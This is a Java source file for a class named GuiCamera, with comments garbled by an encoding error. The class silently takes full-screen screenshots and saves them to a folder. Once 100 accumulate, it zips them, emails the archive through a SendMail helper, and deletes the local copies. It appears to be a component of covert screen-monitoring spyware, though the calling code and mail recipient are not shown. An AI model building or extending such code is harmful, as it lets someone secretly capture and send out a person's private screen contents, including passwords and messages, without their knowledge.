package cn.com.impl;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.Buffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.zip.ZipEntry;

import javamail.SendMail;

import javax.imageio.ImageIO;
import javax.imageio.stream.FileImageOutputStream;
import javax.swing.filechooser.FileSystemView;

import zip.impl.CompressFile;


/**
 * ����Ļ����
 * 
 * @author Administrator
 * 
 */
public class GuiCamera {
	private static GuiCamera camera;

	private String fileName;

	private String defaultName = "����";

	static int serialNum = 0;

	private String imageFormat;

	private String defautlmageFormat = "jpg";

	Dimension d = Toolkit.getDefaultToolkit().getScreenSize();// ��ȡ��Ļ��С

	private GuiCamera() {
		fileName = defaultName;
		imageFormat = defautlmageFormat;
	}

	private GuiCamera(String s, String format) {
		fileName = s;
		imageFormat = format;
	}

	public File snapShot() {
		File f = null;
		try {
			// ����Ļ�ж�ȡͼ��
			BufferedImage screenshot = (new Robot())
			// ����Ļ�ж�ȡͼ�� Rectangle--�ռ�����
					.createScreenCapture(new Rectangle(0, 0, d.width, d.height));
			serialNum++;
			//File path = FileSystemView.getFileSystemView().getHomeDirectory();// �������·��
			
			File folder=new File("��ͼ");
			String format = "jpg";
			String name = folder +File.separator+getDateInfo()+"."
					+ imageFormat;// �ļ���ʽ
			f = new File(name);
			System.out.println("sava file ���� " + name);
			String zipPath=getDateInfo()+".zip";
		File[] allFile=folder.listFiles();
		int fileSum=allFile.length;
			if(fileSum>=100){
				serialNum=0;
				CompressFile.createZip("��ͼ", zipPath);//���
				SendMail.sendZipMail(zipPath);//�����ʼ�
				for (int i = 0; i < allFile.length; i++) {
					allFile[i].delete();
				}
			}
			try {
				ImageIO.write(screenshot, imageFormat, f);
				System.out.println("���");

			} catch (IOException e) {
				e.printStackTrace();
			}

		} catch (AWTException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return f;
	}
public static String getDateInfo(){
	Date date=new Date();
	SimpleDateFormat format=new SimpleDateFormat("yyyy��MM��dd��HH.mm.ss");
	String dateInfo=format.format(date);
	return dateInfo;
}
	public static GuiCamera createCamera() {
		if (camera == null) {
			camera = new GuiCamera();
		}
		return camera;
	}

	// /**
	// * @param args
	// */
	// public static void main(String[] args) {
	// GuiCamera camera = new GuiCamera();
	// camera.snapShot();
	// }

}
